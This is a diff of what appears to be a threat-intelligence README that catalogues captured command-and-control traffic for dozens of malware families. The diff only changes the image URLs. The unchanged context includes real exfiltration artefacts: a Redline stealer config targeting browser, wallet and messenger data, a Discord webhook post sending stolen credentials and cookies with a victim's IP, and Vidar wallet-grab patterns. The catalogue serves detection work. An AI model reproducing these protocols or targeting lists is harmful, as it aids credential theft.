@@ -3196,13 +3196,13 @@ Date: Mon, 02 Aug 2021 19:46:57 GMT
 
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><EnvironmentSettingsResponse xmlns="http://tempuri.org/"><EnvironmentSettingsResult xmlns:a="BrowserExtension" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:BlockedCountry xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/><a:BlockedIP xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>37.142.225.189</b:string></a:BlockedIP><a:Object4>true</a:Object4><a:Object6>false</a:Object6><a:ScanBrowsers>true</a:ScanBrowsers><a:ScanChromeBrowsersPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>%USERPROFILE%\AppData\Local\Battle.net</b:string><b:string>%USERPROFILE%\AppData\Local\Chromium\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Google\Chrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Google(x86)\Chrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Roaming\Opera Software\</b:string><b:string>%USERPROFILE%\AppData\Local\MapleStudio\ChromePlus\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Iridium\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\7Star\7Star\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\CentBrowser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Chedot\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Vivaldi\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Kometa\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Elements Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Epic Privacy Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\uCozMedia\Uran\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</b:string><b:string>%USERPROFILE%\AppData\Local\CatalinaGroup\Citrio\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Coowon\Coowon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\liebao\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\QIP Surf\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Orbitum\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Comodo\Dragon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Amigo\User\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Torch\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Comodo\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\360Browser\Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Maxthon3\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\K-Melon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Sputnik\Sputnik\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Nichrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\CocCoc\Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Uran\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Chromodo\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Mail.Ru\Atom\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\NVIDIA Corporation\NVIDIA GeForce Experience</b:string><b:string>%USERPROFILE%\AppData\Local\Steam</b:string><b:string>%USERPROFILE%\AppData\Local\CryptoTab Browser\User Data</b:string></a:ScanChromeBrowsersPaths><a:ScanDiscord>true</a:ScanDiscord><a:ScanFTP>true</a:ScanFTP><a:ScanFiles>false</a:ScanFiles><a:ScanFilesPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/><a:ScanGeckoBrowsersPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>%USERPROFILE%\AppData\Roaming\Mozilla\Firefox</b:string><b:string>%USERPROFILE%\AppData\Roaming\Waterfox</b:string><b:string>%USERPROFILE%\AppData\Roaming\K-Meleon</b:string><b:string>%USERPROFILE%\AppData\Roaming\Thunderbird</b:string><b:string>%USERPROFILE%\AppData\Roaming\Comodo\IceDragon</b:string><b:string>%USERPROFILE%\AppData\Roaming\8pecxstudios\Cyberfox</b:string><b:string>%USERPROFILE%\AppData\Roaming\NETGATE Technologies\BlackHaw</b:string><b:string>%USERPROFILE%\AppData\Roaming\Moonchild Productions\Pale Moon</b:string></a:ScanGeckoBrowsersPaths><a:ScanScreen>true</a:ScanScreen><a:ScanSteam>true</a:ScanSteam><a:ScanTelegram>true</a:ScanTelegram><a:ScanVPN>true</a:ScanVPN><a:ScanWallets>true</a:ScanWallets></EnvironmentSettingsResult></EnvironmentSettingsResponse></s:Body></s:Envelope>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/redline.png "Redline Stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/redline.png "Redline Stealer")
 
 #### Remcos RAT
 ~~~
 [DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/remcos.png "Remcos")
 
 #### Revcode RAT
 ~~~
@@ -3229,20 +3229,20 @@ Pragma: no-cache
 
 1-1
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revcode.png "Revcode")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/revcode.png "Revcode")
 
 #### Revenge RAT
 ~~~
 InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Revenge RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/revenge.png "Revenge RAT")
 
 #### RMS RAT
 ~~~
 ...........<?xml version="1.0" encoding="UTF-8"?>
 <rman_message version="67002"><code>1</code><string_param></string_param><string_param_2></string_param_2><int_param>1</int_param><data>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxyb21fdmVyc2lvbiB2ZXJzaW9uPSI2NzAwMiI+PHByb2R1Y3Q+Uk1TPC9wcm9kdWN0Pjx2ZXJzaW9uPjY3MDAyPC92ZXJzaW9uPjx0ZXh0X3ZlcnNpb24+Ni43LjAuMjwvdGV4dF92ZXJzaW9uPjxiZXRhX3ZlcnNpb24+MDwvYmV0YV92ZXJzaW9uPjxwcm90b2NvbF92ZXJzaW9uPjU8L3Byb3RvY29sX3ZlcnNpb24+PGtpbmQ+MTwva2luZD48aWQ+NDAwLTYyMi05OTItNzg5PC9pZD48ZGV2aWNlX25hbWU+VXNlci1QQzwvZGV2aWNlX25hbWU+PGNvdW50cnlfY29kZT4yNDQ8L2NvdW50cnlfY29kZT48dXNlcl9kYXRhPjNGNEY1QTZDQjk1MDQ3RkVBNjEwMkJEN0QyMjI2QUE5PC91c2VyX2RhdGE+PHN5c3RlbV9oYXNoPjA4Q0FDN0UyNTQ0MTMzRjNBODIzMEZENUY5MzM0QkMzMUFEQTY5NkVFNUYzMzczQjVEODUzMzZCNTcxRDRFRkQ5MEVGQjU5NzJFRUNFMzg3N0M3QUNENDUyODBGRUJCQTJCMjMzMDZCOENDRkYwRDhDNUUyOTJCQ0M3OEY2MjAzPC9zeXN0ZW1faGFzaD48c3luY19kYXRhPkM4Q0VBOEJBRDQxODFBMjFBNDU4QzVGNkU1MTIwN0Y0PC9zeW5jX2RhdGE+PHJhdGlvPjA8L3JhdGlvPjx0cmlhbF9zdGF0ZT4wPC90cmlhbF9zdGF0ZT48YnBoX3ZlcnNpb24+ZmFsc2U8L2JwaF92ZXJzaW9uPjxsaWNlbnNlX2tleT48L2xpY2Vuc2Vfa2V5PjxkYXlzX2xlZnQ+MDwvZGF5c19sZWZ0Pjwvcm9tX3ZlcnNpb24+DQo=</data></rman_message>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/rms.png "RMS RAT")
 
 #### Sakari Stealer
 ~~~
@@ -3263,7 +3263,7 @@ Content-Type: application/octet-stream
 
 PK.........{<PJ.7y....]...	...image.pngd.y4...>n..,.e..THb.k..Q..D..Yf.1..+.wf..NTv..i....!.a.........}..9..3..y.u].u_..<..f.....SQQ....YQQ..RQ.R.c8.dB...._..V.:T..W..]..i....B#.O...]3=3........P..T.PQQ*...m.;.&3.....G..SO...../|.\.|..7.1b/U.w..K.......j..k.J.z..%..L....u..+..".O..H>..F....Z.e.7.4..9RvH.w...g?...../.............i..v.........
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sakari.png "Sakari")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/sakari.png "Sakari")
 
 #### Sarwent BOT
 ~~~
@@ -3304,8 +3304,8 @@ Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 ~~~
 
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent2.png "Sarwent BOT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/sarwent.png "Sarwent BOT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/sarwent2.png "Sarwent BOT")
 
 #### SDBot
 ~~~
@@ -3318,7 +3318,7 @@ rights=user
 proxyenabled=0
 ....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sdbot.png "SDBot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/sdbot.png "SDBot")
 
 #### Servhelper
 ~~~
@@ -3331,7 +3331,7 @@ Host: laph.icu
 
 key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1E%19%1D%0F%0AT%3C%0E%17%07OELG%22%09%1D%07%05%00%1ALYZ%5DCT.%1A%1D%00%0BT%5BYD%5DCTZ%5BY%0E%06%00L*%10%05%1B%1D%03%01%5D3%17BX0%01%1F%0A%06%02%0E%19%09UT9%3C1%3EB%24%2FK%2B%1B%06%1A%0D%0C%17V%18%13%0D%1A%00%05%03%15%0F%0CO%21%3AB%5B%05%1A%27%3AO3Z%40TY%40&resp=%03%04&rights=%0A%09%12%0A%09&misc=
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/servhelper.png "ServHelper")
 
 #### Sidewinder APT
 ~~~
@@ -3353,7 +3353,7 @@ PK..
 ......d35............	...docProps/SDt..........>;cd`i.a``Pa... fd.3Y.......
 ........*.g.?.i/..cbX....e.`..(....Y.".....S8.r.\. .U...5w%...ZE..I.....0q&,..UT
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sidewinder.png "Sidewinder")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/sidewinder.png "Sidewinder")
 
 #### Smokeloader
 ~~~
@@ -3373,7 +3373,7 @@ Host: thankg1.org
 ..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
 ......qV4`..Pu*...8W.........M .h.v.S.:.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/smokeloader.png "Smokeloader")
 
 #### StelyBuilder (stealer)
 ~~~
@@ -3432,8 +3432,8 @@ CF-RAY: 65a3cb7add71424a-LHR
 
 {"id": "850466121801924668", "type": 0, "content": "```asciidoc\nHi, I got a new account!\n== Standard info == \nIP :: 46.244.28.15\nOS :: Microsoft Windows 7 Professional \nMAC Address :: 06B2996D78FE\n== Browser Account == \nBrowser Account :: N/A\nBrowser Nitro :: N/A\nBrowser Tokens :: \n== Discord Account == \nDiscord Account :: N/A\nDiscord Nitro :: No\nDiscord token :: N/A\n- JustSvK ;D```", "channel_id": "848953638326894686", "author": {"bot": true, "id": "848953655281320046", "username": "Thomas", "avatar": "1c10b14e6bb806dd6141d56993851a34", "discriminator": "0000"}, "attachments": [{"id": "850466121325084732", "filename": "screen.jpg", "size": 64405, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121325084732/screen.jpg", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121325084732/screen.jpg", "width": 1280, "height": 720, "content_type": "image/jpeg"}, {"id": "850466121484337172", "filename": "creds.txt", "size": 1779, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121484337172/creds.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121484337172/creds.txt", "content_type": "text/plain; charset=utf-8"}, {"id": "850466121617899520", "filename": "cookies.txt", "size": 2760, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121617899520/cookies.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121617899520/cookies.txt", "content_type": "text/plain; charset=utf-8"}], "embeds": [], "mentions": [], "mention_roles": [], "pinned": false, "mention_everyone": false, "tts": false, "timestamp": "2021-06-04T20:08:44.334000+00:00", "edited_timestamp": null, "flags": 0, "components": [], "webhook_id": "848953655281320046"}
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely1.png "StelyBuilder")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely2.png "StelyBuilder")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/stely1.png "StelyBuilder")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/stely2.png "StelyBuilder")
 
 #### Taurus Stealer
 ~~~
@@ -3524,7 +3524,7 @@ cf-request-id: 02f85721270000cc9f0f061200000001
 Server: cloudflare
 CF-RAY: 59a0c1483f4acc9f-WAW
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/taurus.png "Taurus")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/taurus.png "Taurus")
 ~~~
 POST /cfg/ HTTP/1.1
 Content-Type: text/html
@@ -3552,7 +3552,7 @@ CF-RAY: 5bd1c0743f44bc54-LHR
 
 dMpxOSxhqkNKhUMze/eJIqACe7beduu+j+9JLQ11DUenzvsd2gvDgNl8PCQTAKwmkESu5dQ9jPymvbu8cXUzl2+wy02w7DG+oVxLZh4+wA==
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/taurus1.png "Taurus")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/taurus1.png "Taurus")
 
 #### tRat
 ~~~
@@ -3563,7 +3563,7 @@ D9946ECBD82F2852885EF1501CB5CD2AFBF2C769F1CFF89D
 A5EB1BAE
 CF896FDFD03355
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trat.png "tRAt")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/trat.png "tRAt")
 
 #### Trickbot
 ~~~
@@ -3577,7 +3577,7 @@ GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08
       << 200 OK
 GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/trickbot.png "Trickbot")
 
 #### Tvrat Teamviewer RAT
 ~~~
@@ -3601,7 +3601,7 @@ Strict-Transport-Security: max-age=31536000;
 
 drun_command=0&drun_URL=NULL&rundll_command=0&rundll_URL=NULL&update_command=0&update_URL=NULL&restart_command=0&terminate_command=0&kill_command=0&poweroff_command=0&reboot_command=0&setinterval_command=0&setinterval_time=70
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/tvrat.png "Tvrat")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/tvrat.png "Tvrat")
 
 #### Ursa Loader
 ~~~
@@ -3628,7 +3628,7 @@ Content-Type: text/html; charset=UTF-8
 
 FHTHSEPHJHWHWHTHWEPHWHJHXIAHRHJEPHSHJIDHYDVDSDVDSDVDSDVDSHHHTHSHXHYEPEPHHGAGMGBEPEPEPFTEPFNFODVDSHHHTHSHXHYEPEPHHGGGBEPEPFTEPERFHERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHPHXFJHFERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVGUFIEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHRFFHPHXFJERDVDSHHHTHSHXHYEPEPICHQHNHSHPGDEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFERDVDSHHHTHSHXHYEPEPHHGPHFHNIFFHEPFTEPERGAFQHAGSHXHJHWHXHAGNIAHGHQHNHHHAERDVDSHHHTHSHXHYEPEPHHGVGFEPFTEPERFEHSHOFKERDVDSHHHTHSHXHYEPEPHHGVGXEPFTEPERFEIFHNHUERDVDSHHHTHSHXHYEPEPHHGUIAHXFJHWEPFTEPERHPHXFJERDVDSHHHTHSHXHYEPEPHHGQHJHSGJHTHFHIEPFTEPERHUHYHTHRIDERDVDSHHHTHSHXHYEPEPHHGAHMHNHQHJHGHJHFHSHXEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFXHUHUEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFX
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursa.png "Ursa Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ursa.png "Ursa Loader")
 
 #### Ursnif
 ~~~
@@ -3647,7 +3647,7 @@ Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"
 \.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
 --36775038942641984568--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ursnif.png "Ursnif POST")
 
 #### Valak
 ~~~
@@ -3658,7 +3658,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.
 Host: katedesktop64.com
 Connection: Keep-Alive
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/valak.png "Valak")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/valak.png "Valak")
 
 #### Vidar Stealer
 ~~~
@@ -3766,9 +3766,9 @@ Content-Encoding: gzip
 
 1,1,1,1,1,1,1,1,1,1,250,DESKTOP;%DESKTOP%\;*wallet*.*:*2fa*.*:*backup*.txt:*backup*.png:*backup*.jpg:*code*.txt:*code*.png:*code*.jpg:*password*.*:*auth*.txt:*auth*.png:*auth*.jpg:*crypto*.*:*key*.txt:*key*.png:*key*.jpg:*ledger*.*:*metamask*.*:*blockchain*.*:*bittrex*.*:*binance*.*:*coinbase*.*:*trezor*.*:*exodus*.*;300;true;movies:music:mp3;lnk;Exodus;%APPDATA%\Roaming\Exodus;*.*;4000;true;movies:music:mp3;JAXX;%APPDATA%\Roaming\Jaxx;*.*;4000;true;movies:music:mp3;
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-3.png "Vidar")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vidar-1.png "Vidar")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vidar-2.png "Vidar")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vidar-3.png "Vidar")
 
 #### Vikro Stealer
 ~~~
@@ -3793,7 +3793,7 @@ CF-RAY: 5af4f7933f21ee50-CDG
 
 DQ27u3FPe6q49xyqPW1NUwmiFepfoVnM3+bp29aXA6PnHDet4inH3Uz/amoP29gM60V90JzIDUG/SizOKUEZi4mBEbtN87zR2KNjUri2aTiiEsKLduXshceImkfhLKeeEp4p9ojbbzkhBkER/GMCSZiWOPwiP5u8ioMjwji3vjQFeyDwaUgmS9CoBPikS397afxOj6KAZLrXVH7BILZMzt0/wfmUfz/wsBfHJkJXETD9ZfbNDLCFSDXgQ7Jcf13R5MCnQQzjhUmO/11KJyegRVREt2ZHwKTIwrMaugYNpV18wxNJyUr8TQ5jF1+ch0yj4suoBjyZe12zNl/l1B6LsX189KhqbRc6+y8uefPV1DAGf+VY5+EC2uEj6xjrrni02ft7ofo3tcaoPsJgR8B2PtV1X6a+ggqYbrGqet3ghsqhj5rRfwbR2i+rW/L5eUJApsQTJYE5gRjDqS545Ul4jK/sqosuOqX6fvkWXqrozKNdvrqZf/4goN1pHm3i5/bggRR3sfZ1CZPTZbczHiw6cxU8ud+VR7F7d425drG2SW9lpzyPWeXInNSyS20muadOpWPPTU83wOpQO86eJ0hvYM6CaQaGJtzXXadrqVjbFYw=
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vikro.png "Vikro Stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vikro.png "Vikro Stealer")
 
 #### Vjworm vjw0rm
 ~~~
@@ -3807,7 +3807,7 @@ Content-Length: 0
 Connection: Keep-Alive
 Cache-Control: no-cache
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vjworm.png "VJworm")
 
 #### VMZeus
 ~~~
@@ -3837,7 +3837,7 @@ Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi
 Server: cloudflare
 CF-RAY: 52931bc13d868eb3-DME
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/vmzeus.png "VMZeus")
 
 #### ZeroBot
 ~~~
@@ -3845,7 +3845,7 @@ GET //uploads/b/m/modules.zip HTTP/1.1
 Host: darkrat.lh1.in
 Connection: Keep-Alive
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot1.png "zerobot1")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/zerobot1.png "zerobot1")
 
 ~~~
 POST /api/zrcdr77/ HTTP/1.1
@@ -3876,7 +3876,7 @@ ICSharpCode.SharpZipLib.Zip.ZipException: Cannot find central directory
 
 -----------------------------8d75c50cdcd2da3--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot2.png "zerobot2")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/zerobot2.png "zerobot2")
 
 #### Zeus
 ~~~
@@ -3931,7 +3931,7 @@ Content-Type: text/html; charset=UTF-8
 
 .U..w..F......_.0p .5.UI..x......MjI............9...?r...<...+..
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zeus.png "Zeus")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/zeus.png "Zeus")
 
 #### zgRAT
 ~~~
@@ -3941,7 +3941,7 @@ Content-Type: text/html; charset=UTF-8
 00000024  32 33 77 74 b3 34 33 76  75 75 32 34 70 74 33 75   23wt.43v uu24pt3u
 00000034  73 36 77 73 04 2b 02 00  c8 a1 5a d2 2b 00 00 00   s6ws.+.. ..Z.+...
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zgrat.png "zgRAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/zgrat.png "zgRAT")
 
 #### Zyklon Loader
 ~~~
@@ -3963,7 +3963,7 @@ Connection: keep-alive
 Keep-Alive: timeout=30
 X-Powered-By: PHP/5.6.40
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zyklon.png "Zyklon")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/zyklon.png "Zyklon")
 
 ### Unknowns
 ###########################################################################################
@@ -4011,7 +4011,7 @@ Content-Type: text/html; charset=UTF-8
 
 2
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")
 
 #### UnknownMalware5
 ~~~
@@ -4044,4 +4044,4 @@ Content-Length: 0
 Connection: keep-alive
 Content-Encoding: identity
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownmalware5.png "UnknownMalware5")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/unknownmalware5.png "UnknownMalware5")
